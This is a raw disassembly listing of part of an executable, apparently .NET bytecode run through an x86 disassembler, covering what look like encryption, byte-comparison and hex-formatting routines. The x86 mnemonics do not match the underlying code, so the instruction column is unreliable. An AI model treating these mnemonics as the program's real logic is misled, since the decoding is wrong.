  4041a4:	0a 0b                	or     (%ebx),%cl
  4041a6:	07                   	pop    %es
  4041a7:	20 00                	and    %al,(%eax)
  4041a9:	01 00                	add    %eax,(%eax)
  4041ab:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	0a 07                	or     (%edi),%al
  4041b2:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b8:	d3 00                	roll   %cl,(%eax)
  4041ba:	00 0a                	add    %cl,(%edx)
  4041bc:	07                   	pop    %es
  4041bd:	17                   	pop    %ss
  4041be:	6f                   	outsl  %ds:(%esi),(%dx)
  4041bf:	d4 00                	aam    $0x0
  4041c1:	00 0a                	add    %cl,(%edx)
  4041c3:	07                   	pop    %es
  4041c4:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	0a 07                	or     (%edi),%al
  4041cb:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	04 6f                	add    $0x6f,%al
  4041d2:	d6                   	salc
  4041d3:	00 00                	add    %al,(%eax)
  4041d5:	0a 07                	or     (%edi),%al
  4041d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d8:	d7                   	xlat   %ds:(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	0a 06                	or     (%esi),%al
  4041dd:	07                   	pop    %es
  4041de:	6f                   	outsl  %ds:(%esi),(%dx)
  4041df:	d8 00                	fadds  (%eax)
  4041e1:	00 0a                	add    %cl,(%edx)
  4041e3:	17                   	pop    %ss
  4041e4:	73 d9                	jae    0x4041bf
  4041e6:	00 00                	add    %al,(%eax)
  4041e8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041eb:	07                   	pop    %es
  4041ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ed:	da 00                	fiaddl (%eax)
  4041ef:	00 0a                	add    %cl,(%edx)
  4041f1:	16                   	push   %ss
  4041f2:	07                   	pop    %es
  4041f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4041f4:	da 00                	fiaddl (%eax)
  4041f6:	00 0a                	add    %cl,(%edx)
  4041f8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041fb:	4c                   	dec    %esp
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	0a 08                	or     (%eax),%cl
  404200:	03 16                	add    (%esi),%edx
  404202:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404208:	00 0a                	add    %cl,(%edx)
  40420a:	08 6f db             	or     %ch,-0x25(%edi)
  40420d:	00 00                	add    %al,(%eax)
  40420f:	0a 02                	or     (%edx),%al
  404211:	7b 2b                	jnp    0x40423e
  404213:	00 00                	add    %al,(%eax)
  404215:	04 73                	add    $0x73,%al
  404217:	dc 00                	faddl  (%eax)
  404219:	00 0a                	add    %cl,(%edx)
  40421b:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404220:	00 00                	add    %al,(%eax)
  404222:	0a 1f                	or     (%edi),%bl
  404224:	20 06                	and    %al,(%esi)
  404226:	6f                   	outsl  %ds:(%esi),(%dx)
  404227:	dd 00                	fldl   (%eax)
  404229:	00 0a                	add    %cl,(%edx)
  40422b:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40422e:	20 59 6f             	and    %bl,0x6f(%ecx)
  404231:	de 00                	fiadds (%eax)
  404233:	00 0a                	add    %cl,(%edx)
  404235:	13 04 06             	adc    (%esi,%eax,1),%eax
  404238:	16                   	push   %ss
  404239:	6a 6f                	push   $0x6f
  40423b:	4e                   	dec    %esi
  40423c:	00 00                	add    %al,(%eax)
  40423e:	0a 06                	or     (%esi),%al
  404240:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404243:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404246:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  40424d:	27                   	daa
  40424e:	00 00                	add    %al,(%eax)
  404250:	00 09                	add    %cl,(%ecx)
  404252:	39 06                	cmp    %eax,(%esi)
  404254:	00 00                	add    %al,(%eax)
  404256:	00 09                	add    %cl,(%ecx)
  404258:	6f                   	outsl  %ds:(%esi),(%dx)
  404259:	33 00                	xor    (%eax),%eax
  40425b:	00 0a                	add    %cl,(%edx)
  40425d:	dc 08                	fmull  (%eax)
  40425f:	39 06                	cmp    %eax,(%esi)
  404261:	00 00                	add    %al,(%eax)
  404263:	00 08                	add    %cl,(%eax)
  404265:	6f                   	outsl  %ds:(%esi),(%dx)
  404266:	33 00                	xor    (%eax),%eax
  404268:	00 0a                	add    %cl,(%edx)
  40426a:	dc 07                	faddl  (%edi)
  40426c:	39 06                	cmp    %eax,(%esi)
  40426e:	00 00                	add    %al,(%eax)
  404270:	00 07                	add    %al,(%edi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	33 00                	xor    (%eax),%eax
  404275:	00 0a                	add    %cl,(%edx)
  404277:	dc 06                	faddl  (%esi)
  404279:	6f                   	outsl  %ds:(%esi),(%dx)
  40427a:	dd 00                	fldl   (%eax)
  40427c:	00 0a                	add    %cl,(%edx)
  40427e:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  404284:	00 06                	add    %al,(%esi)
  404286:	39 06                	cmp    %eax,(%esi)
  404288:	00 00                	add    %al,(%eax)
  40428a:	00 06                	add    %al,(%esi)
  40428c:	6f                   	outsl  %ds:(%esi),(%dx)
  40428d:	33 00                	xor    (%eax),%eax
  40428f:	00 0a                	add    %cl,(%edx)
  404291:	dc 11                	fcoml  (%ecx)
  404293:	05 2a 00 00 00       	add    $0x2a,%eax
  404298:	01 34 00             	add    %esi,(%eax,%eax,1)
  40429b:	00 02                	add    %al,(%edx)
  40429d:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	02 00                	add    (%eax),%al
  4042aa:	6a 00                	push   $0x0
  4042ac:	74 de                	je     0x40428c
  4042ae:	00 0d 00 00 00 00    	add    %cl,0x0
  4042b4:	02 00                	add    (%eax),%al
  4042b6:	26 00 c5             	es add %al,%ch
  4042b9:	eb 00                	jmp    0x4042bb
  4042bb:	0d 00 00 00 00       	or     $0x0,%eax
  4042c0:	02 00                	add    (%eax),%al
  4042c2:	17                   	pop    %ss
  4042c3:	00 ee                	add    %ch,%dh
  4042c5:	05 01 0d 00 00       	add    $0xd01,%eax
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	1b 30                	sbb    (%eax),%esi
  4042ce:	05 00 50 01 00       	add    $0x15000,%eax
  4042d3:	00 17                	add    %dl,(%edi)
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	11 03                	adc    %eax,(%ebx)
  4042d9:	3a 0b                	cmp    (%ebx),%cl
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	00 72 ac             	add    %dh,-0x54(%edx)
  4042e0:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042e4:	cf                   	iret
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 7a 03             	or     0x3(%edx),%bh
  4042ea:	73 4d                	jae    0x404339
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	0a 0a                	or     (%edx),%cl
  4042f0:	73 d1                	jae    0x4042c3
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 0b                	or     (%ebx),%cl
  4042f6:	07                   	pop    %es
  4042f7:	20 00                	and    %al,(%eax)
  4042f9:	01 00                	add    %eax,(%eax)
  4042fb:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042fe:	00 00                	add    %al,(%eax)
  404300:	0a 07                	or     (%edi),%al
  404302:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404308:	d3 00                	roll   %cl,(%eax)
  40430a:	00 0a                	add    %cl,(%edx)
  40430c:	07                   	pop    %es
  40430d:	17                   	pop    %ss
  40430e:	6f                   	outsl  %ds:(%esi),(%dx)
  40430f:	d4 00                	aam    $0x0
  404311:	00 0a                	add    %cl,(%edx)
  404313:	07                   	pop    %es
  404314:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  404317:	00 00                	add    %al,(%eax)
  404319:	0a 07                	or     (%edi),%al
  40431b:	02 7b 2a             	add    0x2a(%ebx),%bh
  40431e:	00 00                	add    %al,(%eax)
  404320:	04 6f                	add    $0x6f,%al
  404322:	d6                   	salc
  404323:	00 00                	add    %al,(%eax)
  404325:	0a 02                	or     (%edx),%al
  404327:	7b 2b                	jnp    0x404354
  404329:	00 00                	add    %al,(%eax)
  40432b:	04 73                	add    $0x73,%al
  40432d:	dc 00                	faddl  (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	0c 08                	or     $0x8,%al
  404333:	06                   	push   %es
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	1f                   	pop    %ds
  40433a:	20 06                	and    %al,(%esi)
  40433c:	6f                   	outsl  %ds:(%esi),(%dx)
  40433d:	dd 00                	fldl   (%eax)
  40433f:	00 0a                	add    %cl,(%edx)
  404341:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404344:	20 59 6f             	and    %bl,0x6f(%ecx)
  404347:	de 00                	fiadds (%eax)
  404349:	00 0a                	add    %cl,(%edx)
  40434b:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404350:	00 00                	add    %al,(%eax)
  404352:	01 13                	add    %edx,(%ebx)
  404354:	04 06                	add    $0x6,%al
  404356:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404359:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40435c:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404363:	02 09                	add    (%ecx),%cl
  404365:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404368:	50                   	push   %eax
  404369:	00 00                	add    %al,(%eax)
  40436b:	06                   	push   %es
  40436c:	3a 0b                	cmp    (%ebx),%cl
  40436e:	00 00                	add    %al,(%eax)
  404370:	00 72 da             	add    %dh,-0x26(%edx)
  404373:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404377:	df 00                	filds  (%eax)
  404379:	00 0a                	add    %cl,(%edx)
  40437b:	7a dd                	jp     0x40435a
  40437d:	0d 00 00 00 08       	or     $0x8000000,%eax
  404382:	39 06                	cmp    %eax,(%esi)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 08                	add    %cl,(%eax)
  404388:	6f                   	outsl  %ds:(%esi),(%dx)
  404389:	33 00                	xor    (%eax),%eax
  40438b:	00 0a                	add    %cl,(%edx)
  40438d:	dc 1f                	fcompl (%edi)
  40438f:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  404395:	13 05 06 11 05 16    	adc    0x16051106,%eax
  40439b:	1f                   	pop    %ds
  40439c:	10 6f 45             	adc    %ch,0x45(%edi)
  40439f:	00 00                	add    %al,(%eax)
  4043a1:	0a 26                	or     (%esi),%ah
  4043a3:	07                   	pop    %es
  4043a4:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043aa:	0a 06                	or     (%esi),%al
  4043ac:	07                   	pop    %es
  4043ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ae:	e1 00                	loope  0x4043b0
  4043b0:	00 0a                	add    %cl,(%edx)
  4043b2:	16                   	push   %ss
  4043b3:	73 d9                	jae    0x40438e
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	0a 13                	or     (%ebx),%dl
  4043b9:	06                   	push   %es
  4043ba:	06                   	push   %es
  4043bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4043bc:	e2 00                	loop   0x4043be
  4043be:	00 0a                	add    %cl,(%edx)
  4043c0:	1f                   	pop    %ds
  4043c1:	10 6a 59             	adc    %ch,0x59(%edx)
  4043c4:	17                   	pop    %ss
  4043c5:	6a 58                	push   $0x58
  4043c7:	d4 8d                	aam    $0x8d
  4043c9:	44                   	inc    %esp
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	01 13                	add    %edx,(%ebx)
  4043ce:	07                   	pop    %es
  4043cf:	11 06                	adc    %eax,(%esi)
  4043d1:	11 07                	adc    %eax,(%edi)
  4043d3:	16                   	push   %ss
  4043d4:	11 07                	adc    %eax,(%edi)
  4043d6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d9:	45                   	inc    %ebp
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043e2:	13 08                	adc    (%eax),%ecx
  4043e4:	11 07                	adc    %eax,(%edi)
  4043e6:	16                   	push   %ss
  4043e7:	11 08                	adc    %ecx,(%eax)
  4043e9:	16                   	push   %ss
  4043ea:	11 08                	adc    %ecx,(%eax)
  4043ec:	8e 69 28             	mov    0x28(%ecx),%gs
  4043ef:	e3 00                	jecxz  0x4043f1
  4043f1:	00 0a                	add    %cl,(%edx)
  4043f3:	11 08                	adc    %ecx,(%eax)
  4043f5:	13 09                	adc    (%ecx),%ecx
  4043f7:	dd 29                	(bad) (%ecx)
  4043f9:	00 00                	add    %al,(%eax)
  4043fb:	00 11                	add    %dl,(%ecx)
  4043fd:	06                   	push   %es
  4043fe:	39 07                	cmp    %eax,(%edi)
  404400:	00 00                	add    %al,(%eax)
  404402:	00 11                	add    %dl,(%ecx)
  404404:	06                   	push   %es
  404405:	6f                   	outsl  %ds:(%esi),(%dx)
  404406:	33 00                	xor    (%eax),%eax
  404408:	00 0a                	add    %cl,(%edx)
  40440a:	dc 07                	faddl  (%edi)
  40440c:	39 06                	cmp    %eax,(%esi)
  40440e:	00 00                	add    %al,(%eax)
  404410:	00 07                	add    %al,(%edi)
  404412:	6f                   	outsl  %ds:(%esi),(%dx)
  404413:	33 00                	xor    (%eax),%eax
  404415:	00 0a                	add    %cl,(%edx)
  404417:	dc 06                	faddl  (%esi)
  404419:	39 06                	cmp    %eax,(%esi)
  40441b:	00 00                	add    %al,(%eax)
  40441d:	00 06                	add    %al,(%esi)
  40441f:	6f                   	outsl  %ds:(%esi),(%dx)
  404420:	33 00                	xor    (%eax),%eax
  404422:	00 0a                	add    %cl,(%edx)
  404424:	dc 11                	fcoml  (%ecx)
  404426:	09 2a                	or     %ebp,(%edx)
  404428:	41                   	inc    %ecx
  404429:	64 00 00             	add    %al,%fs:(%eax)
  40442c:	02 00                	add    (%eax),%al
  40442e:	00 00                	add    %al,(%eax)
  404430:	5a                   	pop    %edx
  404431:	00 00                	add    %al,(%eax)
  404433:	00 4f 00             	add    %cl,0x0(%edi)
  404436:	00 00                	add    %al,(%eax)
  404438:	a9 00 00 00 0d       	test   $0xd000000,%eax
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 00                	add    %al,(%eax)
  404441:	00 00                	add    %al,(%eax)
  404443:	00 02                	add    %al,(%edx)
  404445:	00 00                	add    %al,(%eax)
  404447:	00 e2                	add    %ah,%dl
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 42 00             	add    %al,0x0(%edx)
  40444e:	00 00                	add    %al,(%eax)
  404450:	24 01                	and    $0x1,%al
  404452:	00 00                	add    %al,(%eax)
  404454:	0f 00 00             	sldt   (%eax)
  404457:	00 00                	add    %al,(%eax)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 02                	add    %al,(%edx)
  40445d:	00 00                	add    %al,(%eax)
  40445f:	00 1e                	add    %bl,(%esi)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 15 01 00 00 33    	add    %dl,0x33000001
  404469:	01 00                	add    %eax,(%eax)
  40446b:	00 0d 00 00 00 00    	add    %cl,0x0
  404471:	00 00                	add    %al,(%eax)
  404473:	00 02                	add    %al,(%edx)
  404475:	00 00                	add    %al,(%eax)
  404477:	00 18                	add    %bl,(%eax)
  404479:	00 00                	add    %al,(%eax)
  40447b:	00 28                	add    %ch,(%eax)
  40447d:	01 00                	add    %eax,(%eax)
  40447f:	00 40 01             	add    %al,0x1(%eax)
  404482:	00 00                	add    %al,(%eax)
  404484:	0d 00 00 00 00       	or     $0x0,%eax
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 13                	add    %dl,(%ebx)
  40448d:	30 03                	xor    %al,(%ebx)
  40448f:	00 22                	add    %ah,(%edx)
  404491:	00 00                	add    %al,(%eax)
  404493:	00 18                	add    %bl,(%eax)
  404495:	00 00                	add    %al,(%eax)
  404497:	11 17                	adc    %edx,(%edi)
  404499:	0a 16                	or     (%esi),%dl
  40449b:	0b 38                	or     (%eax),%edi
  40449d:	11 00                	adc    %eax,(%eax)
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	03 07                	add    (%edi),%eax
  4044a3:	91                   	xchg   %eax,%ecx
  4044a4:	04 07                	add    $0x7,%al
  4044a6:	91                   	xchg   %eax,%ecx
  4044a7:	3b 02                	cmp    (%edx),%eax
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 16                	add    %dl,(%esi)
  4044ad:	0a 07                	or     (%edi),%al
  4044af:	17                   	pop    %ss
  4044b0:	58                   	pop    %eax
  4044b1:	0b 07                	or     (%edi),%eax
  4044b3:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b9:	2a 00                	sub    (%eax),%al
  4044bb:	00 1b                	add    %bl,(%ebx)
  4044bd:	30 03                	xor    %al,(%ebx)
  4044bf:	00 6e 00             	add    %ch,0x0(%esi)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	19 00                	sbb    %eax,(%eax)
  4044c6:	00 11                	add    %dl,(%ecx)
  4044c8:	28 19                	sub    %bl,(%ecx)
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	0a 02                	or     (%edx),%al
  4044ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4044cf:	1f                   	pop    %ds
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 0a                	or     (%edx),%cl
  4044d4:	73 e5                	jae    0x4044bb
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	0a 0b                	or     (%ebx),%cl
  4044da:	07                   	pop    %es
  4044db:	06                   	push   %es
  4044dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dd:	8f 00                	pop    (%eax)
  4044df:	00 0a                	add    %cl,(%edx)
  4044e1:	0a dd                	or     %ch,%bl
  4044e3:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e8:	39 06                	cmp    %eax,(%esi)
  4044ea:	00 00                	add    %al,(%eax)
  4044ec:	00 07                	add    %al,(%edi)
  4044ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4044ef:	33 00                	xor    (%eax),%eax
  4044f1:	00 0a                	add    %cl,(%edx)
  4044f3:	dc 73 90             	fdivl  -0x70(%ebx)
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044fb:	0d 16 13 04 38       	or     $0x38041316,%eax
  404500:	1f                   	pop    %ds
  404501:	00 00                	add    %al,(%eax)
  404503:	00 09                	add    %cl,(%ecx)
  404505:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404508:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40450e:	30 27                	xor    %ah,(%edi)
  404510:	00 70 28             	add    %dh,0x28(%eax)
  404513:	91                   	xchg   %eax,%ecx
  404514:	00 00                	add    %al,(%eax)
  404516:	0a 6f 92             	or     -0x6e(%edi),%ch
  404519:	00 00                	add    %al,(%eax)
  40451b:	0a 26                	or     (%esi),%ah
  40451d:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404520:	58                   	pop    %eax
  404521:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404524:	04 09                	add    $0x9,%al
  404526:	8e 69 32             	mov    0x32(%ecx),%gs
  404529:	da 08                	fimull (%eax)
  40452b:	6f                   	outsl  %ds:(%esi),(%dx)
  40452c:	38 00                	cmp    %al,(%eax)
  40452e:	00 0a                	add    %cl,(%edx)
  404530:	6f                   	outsl  %ds:(%esi),(%dx)
  404531:	94                   	xchg   %eax,%esp
  404532:	00 00                	add    %al,(%eax)
  404534:	0a 2a                	or     (%edx),%ch
  404536:	00 00                	add    %al,(%eax)
  404538:	01 10                	add    %edx,(%eax)
  40453a:	00 00                	add    %al,(%eax)
  40453c:	02 00                	add    (%eax),%al
  40453e:	12 00                	adc    (%eax),%al
  404540:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1b                	add    %bl,(%ebx)
  404549:	30 02                	xor    %al,(%edx)
  40454b:	00 22                	add    %ah,(%edx)
  40454d:	00 00                	add    %al,(%eax)
  40454f:	00 1a                	add    %bl,(%edx)
  404551:	00 00                	add    %al,(%eax)
  404553:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0a                	or     (%edx),%cl
  40455a:	06                   	push   %es
  40455b:	02 6f 8f             	add    -0x71(%edi),%ch
  40455e:	00 00                	add    %al,(%eax)
  404560:	0a 0b                	or     (%ebx),%cl
  404562:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404568:	39 06                	cmp    %eax,(%esi)
  40456a:	00 00                	add    %al,(%eax)
  40456c:	00 06                	add    %al,(%esi)
  40456e:	6f                   	outsl  %ds:(%esi),(%dx)
  40456f:	33 00                	xor    (%eax),%eax
  404571:	00 0a                	add    %cl,(%edx)
  404573:	dc 07                	faddl  (%edi)
  404575:	2a 00                	sub    (%eax),%al
  404577:	00 01                	add    %al,(%ecx)
  404579:	10 00                	adc    %al,(%eax)
  40457b:	00 02                	add    %al,(%edx)
  40457d:	00 06                	add    %al,(%esi)
  40457f:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  404585:	00 00                	add    %al,(%eax)
  404587:	00 13                	add    %dl,(%ebx)
  404589:	30 03                	xor    %al,(%ebx)
  40458b:	00 3b                	add    %bh,(%ebx)
  40458d:	00 00                	add    %al,(%eax)
  40458f:	00 1b                	add    %bl,(%ebx)
  404591:	00 00                	add    %al,(%eax)
  404593:	11 73 90             	adc    %esi,-0x70(%ebx)
  404596:	00 00                	add    %al,(%eax)
  404598:	0a 0a                	or     (%edx),%cl
  40459a:	02 0b                	add    (%ebx),%cl
  40459c:	16                   	push   %ss
  40459d:	0c 38                	or     $0x38,%al
  40459f:	1f                   	pop    %ds
  4045a0:	00 00                	add    %al,(%eax)
  4045a2:	00 07                	add    %al,(%edi)
  4045a4:	08 91 0d 06 72 36    	or     %dl,0x3672060d(%ecx)
  4045aa:	27                   	daa
  4045ab:	00 70 09             	add    %dh,0x9(%eax)
  4045ae:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045b2:	01 28                	add    %ebp,(%eax)
  4045b4:	e6 00                	out    %al,$0x0
  4045b6:	00 0a                	add    %cl,(%edx)
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	92                   	xchg   %eax,%edx
  4045ba:	00 00                	add    %al,(%eax)
  4045bc:	0a 26                	or     (%esi),%ah
  4045be:	08 17                	or     %dl,(%edi)
  4045c0:	58                   	pop    %eax
  4045c1:	0c 08                	or     $0x8,%al
  4045c3:	07                   	pop    %es
  4045c4:	8e 69 32             	mov    0x32(%ecx),%gs
  4045c7:	db 06                	fildl  (%esi)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	2a 00                	sub    (%eax),%al
  4045d0:	13 30                	adc    (%eax),%esi
  4045d2:	03 00                	add    (%eax),%eax
  4045d4:	3b 00                	cmp    (%eax),%eax
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	1b 00                	sbb    (%eax),%eax
  4045da:	00 11                	add    %dl,(%ecx)
  4045dc:	73 90                	jae    0x40456e
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 0a                	or     (%edx),%cl
  4045e2:	02 0b                	add    (%ebx),%cl
  4045e4:	16                   	push   %ss
  4045e5:	0c 38                	or     $0x38,%al
  4045e7:	1f                   	pop    %ds
  4045e8:	00 00                	add    %al,(%eax)
  4045ea:	00 07                	add    %al,(%edi)
  4045ec:	08 91 0d 06 72 46    	or     %dl,0x4672060d(%ecx)
  4045f2:	27                   	daa
  4045f3:	00 70 09             	add    %dh,0x9(%eax)
  4045f6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045fa:	01 28                	add    %ebp,(%eax)
  4045fc:	e6 00                	out    %al,$0x0
  4045fe:	00 0a                	add    %cl,(%edx)
  404600:	6f                   	outsl  %ds:(%esi),(%dx)
  404601:	92                   	xchg   %eax,%edx
  404602:	00 00                	add    %al,(%eax)
  404604:	0a 26                	or     (%esi),%ah
  404606:	08 17                	or     %dl,(%edi)
  404608:	58                   	pop    %eax
  404609:	0c 08                	or     $0x8,%al
  40460b:	07                   	pop    %es
  40460c:	8e 69 32             	mov    0x32(%ecx),%gs
  40460f:	db 06                	fildl  (%esi)
  404611:	6f                   	outsl  %ds:(%esi),(%dx)
  404612:	38 00                	cmp    %al,(%eax)
  404614:	00 0a                	add    %cl,(%edx)
  404616:	2a 00                	sub    (%eax),%al
  404618:	13 30                	adc    (%eax),%esi
  40461a:	04 00                	add    $0x0,%al
  40461c:	2c 00                	sub    $0x0,%al
  40461e:	00 00                	add    %al,(%eax)
  404620:	1c 00                	sbb    $0x0,%al
  404622:	00 11                	add    %dl,(%ecx)
  404624:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  40462a:	00 01                	add    %al,(%ecx)
  40462c:	0a 02                	or     (%edx),%al
  40462e:	8e 69 17             	mov    0x17(%ecx),%gs
  404631:	59                   	pop    %ecx
  404632:	0b 16                	or     (%esi),%edx
  404634:	0c 38                	or     $0x38,%al
  404636:	0e                   	push   %cs
  404637:	00 00                	add    %al,(%eax)
  404639:	00 06                	add    %al,(%esi)
  40463b:	08 02                	or     %al,(%edx)
  40463d:	07                   	pop    %es
  40463e:	91                   	xchg   %eax,%ecx
  40463f:	9c                   	pushf
  404640:	07                   	pop    %es
  404641:	17                   	pop    %ss
  404642:	59                   	pop    %ecx
  404643:	0b 08                	or     (%eax),%ecx
  404645:	17                   	pop    %ss
  404646:	58                   	pop    %eax
  404647:	0c 08                	or     $0x8,%al
  404649:	06                   	push   %es
  40464a:	8e 69 32             	mov    0x32(%ecx),%gs
  40464d:	ec                   	in     (%dx),%al
  40464e:	06                   	push   %es
  40464f:	2a 13                	sub    (%ebx),%dl
  404651:	30 02                	xor    %al,(%edx)
  404653:	00 36                	add    %dh,(%esi)
  404655:	00 00                	add    %al,(%eax)
  404657:	00 01                	add    %al,(%ecx)
  404659:	00 00                	add    %al,(%eax)
  40465b:	11 16                	adc    %edx,(%esi)
  40465d:	0a 38                	or     (%eax),%bh
  40465f:	15 00 00 00 02       	adc    $0x2000000,%eax
  404664:	7b 38                	jnp    0x40469e
  404666:	00 00                	add    %al,(%eax)
  404668:	04 06                	add    $0x6,%al
  40466a:	6f                   	outsl  %ds:(%esi),(%dx)
  40466b:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  404672:	00 06                	add    %al,(%esi)
  404674:	06                   	push   %es
  404675:	17                   	pop    %ss
  404676:	58                   	pop    %eax
  404677:	0a 06                	or     (%esi),%al
  404679:	02 7b 38             	add    0x38(%ebx),%bh
  40467c:	00 00                	add    %al,(%eax)
  40467e:	04 6f                	add    $0x6f,%al
  404680:	eb 00                	jmp    0x404682
  404682:	00 0a                	add    %cl,(%edx)
  404684:	32 dd                	xor    %ch,%bl
  404686:	02 7b 38             	add    0x38(%ebx),%bh
  404689:	00 00                	add    %al,(%eax)
  40468b:	04 6f                	add    $0x6f,%al
  40468d:	ec                   	in     (%dx),%al
  40468e:	00 00                	add    %al,(%eax)
  404690:	0a 2a                	or     (%edx),%ch
  404692:	00 00                	add    %al,(%eax)
  404694:	13 30                	adc    (%eax),%esi
  404696:	02 00                	add    (%eax),%al
  404698:	1b 00                	sbb    (%eax),%eax
  40469a:	00 00                	add    %al,(%eax)
  40469c:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  4046a1:	94                   	xchg   %eax,%esp
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	06                   	push   %es
  4046a5:	0a 06                	or     (%esi),%al
  4046a7:	02 7d 37             	add    0x37(%ebp),%bh
  4046aa:	00 00                	add    %al,(%eax)
  4046ac:	04 02                	add    $0x2,%al
  4046ae:	7b 38                	jnp    0x4046e8
  4046b0:	00 00                	add    %al,(%eax)
  4046b2:	04 06                	add    $0x6,%al
  4046b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b5:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046ba:	2a 00                	sub    (%eax),%al
  4046bc:	1b 30                	sbb    (%eax),%esi
  4046be:	02 00                	add    (%eax),%al
  4046c0:	60                   	pusha
  4046c1:	00 00                	add    %al,(%eax)
  4046c3:	00 1e                	add    %bl,(%esi)
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ce:	7d 00                	jge    0x4046d0
  4046d0:	00 0a                	add    %cl,(%edx)
  4046d2:	0c 02                	or     $0x2,%al
  4046d4:	7b 38                	jnp    0x40470e
  4046d6:	00 00                	add    %al,(%eax)
  4046d8:	04 6f                	add    $0x6f,%al
  4046da:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046df:	38 26                	cmp    %ah,(%esi)
  4046e1:	00 00                	add    %al,(%eax)
